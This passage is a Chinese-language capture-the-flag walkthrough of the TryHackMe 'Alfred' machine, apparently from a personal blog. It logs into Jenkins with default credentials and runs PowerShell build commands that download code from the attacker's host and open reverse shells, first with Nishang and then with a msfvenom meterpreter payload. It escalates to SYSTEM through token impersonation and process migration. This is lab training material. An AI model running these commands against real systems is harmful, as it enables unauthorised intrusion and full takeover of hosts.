# TryHackMe -- Alfred


Alfred Walkthrough.

<!--more-->

# THM - Alfred

## Initial Access

### How many ports are open? (TCP only)

端口扫描，直接nmap扫描即可：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools]
└─$ sudo nmap -T4 -sV -Pn 10.10.222.189
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 01:34 EST
Nmap scan report for localhost (10.10.222.189)
Host is up (0.36s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds
```

这里没有扫描全端口，我个人的思路是先看常规端口，如果确定没有东西了，再去扫其他端口。

### What is the username and password for the login panel? (in the format username:password)

需要找一个带登录框的页面，80端口没有，在8080端口找到了：

![image-20240307153745508](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071537590.png)

源码上没有东西，应该是要爆破。burp尝试一下：

![image-20240307154440058](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071544087.png)

最终发现`admin/admin`。

其实这里应该先尝试一下jenkins的默认账号密码，就是`admin/admin`。

### What is the user.txt flag? 

这里是希望我们使用[Nishang](https://github.com/samratashok/nishang)工具，大概思路就是在jenkins的dashboard中找到一个能够执行命令的地方，把工具下载下来然后执行，在攻击机做监听就可以获得反弹shell。

首先，把需要用的脚本下载到攻击机https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1；

然后，kali开启web server，为了目标机器能访问到下载脚本：`python -m http.server 8081`；

回到jenkins，执行命令的地方在：

![image-20240307160101134](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601188.png)

![image-20240307160120348](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071601397.png)

![image-20240307160444462](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071604511.png)

需要执行的命令：

```shell
powershell iex (New-Object Net.WebClient).DownloadString(‘http://10.2.124.22:8081/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.124.22 -Port 4444
```

作用就是从kali下载文件，然后去执行命令，反弹shell到kali的4444端口。

kali本地开启监听，回到上层，点击build now：

![image-20240307160553950](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071605992.png)

kali的监听，成功拿到shell：

![image-20240307163746128](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071637189.png)

user.txt在bruce的桌面上。

有报错的话可以在执行的build历史中查看详细信息：

![image-20240307160711688](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403071607735.png)

## Switching Shells

这一步其实在重复上面的步骤，我们可以不用powershell脚本，而是直接用msfvenom生成一个payload，然后把反弹shell引到msf上去。同理，使用cs也可以实现一样的效果。

需要执行的命令：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.124.22 LPORT=4443 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

修改一下project里要执行的命令：

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.124.22:8081/shell.exe','shell.exe')"
```

msf中：

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.2.124.22
set LPORT 4443
run

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.2.124.22:4443
[*] Sending stage (176198 bytes) to 10.10.53.218
[*] Meterpreter session 1 opened (10.2.124.22:4443 -> 10.10.53.218:49236) at 2024-03-07 04:05:29 -0500

meterpreter > sysinfo
Computer        : ALFRED
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

## Privilege Escalation

拿到初始权限，下一步就是提权，这里希望我们使用假冒token来实现提权。关于token，看这https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens

记住两种主要的token就行，这里使用的是第二种。

- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

以下是几种经常被冒用的令牌：

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

在反弹shell里，使用`whoami /priv`可以看到当前的令牌权限：

```shell
C:\Program Files (x86)\Jenkins\workspace\shell>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

可以看到当前用户的`SeDebugPrivilege`、`SeImpersonatePrivilege `、`SeCreateGlobalPrivilege`权限是开启的。

但是这里跟在meterpreter中获得结果不太一样：

```shell
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

然后准备提权，加载incognito，该模块是meterpreter中的一个模块，用来模拟用户token。

使用`list_tokens -g`查看token：

```SHELL
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators						--> 存在administrator的token
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

使用命令`impersonate_token "BUILTIN\Administrators" `来获取administrator的token：

```SHELL
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

成功拿到system权限。

虽然我们此时拿到了system的权限，但是此时并不是system用户。此时我们的进程是shell.exe进程，它的用户是bruce，我们只是有了一个system权限的token。那么下一步，我们可以考虑把权限从当前的shell.exe进程迁移到进程用户是administrator的进程上去，这样我们就有了进程用户administrator的权限。

常用的一个进程是service.exe，进程用户是system：

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
... ...
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe		--> 进程的所有者是system
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 ... ...
  2280  1528  shell.exe             x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\shell\shell.exe  --> 进程的所有者是bruce
 ... ...
 
```

直接使用`migrate`命令进行迁移即可：

```shell
meterpreter > migrate 668
[*] Migrating from 2280 to 668...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

读取flag：

```shell
C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a
```

## 总结

整体来说常规思路，目的就是熟悉jenkins这个软件，至于后续的提权什么的，属于常规思路。

扫 -> 弱口令 -> 功能利用 -> 提权
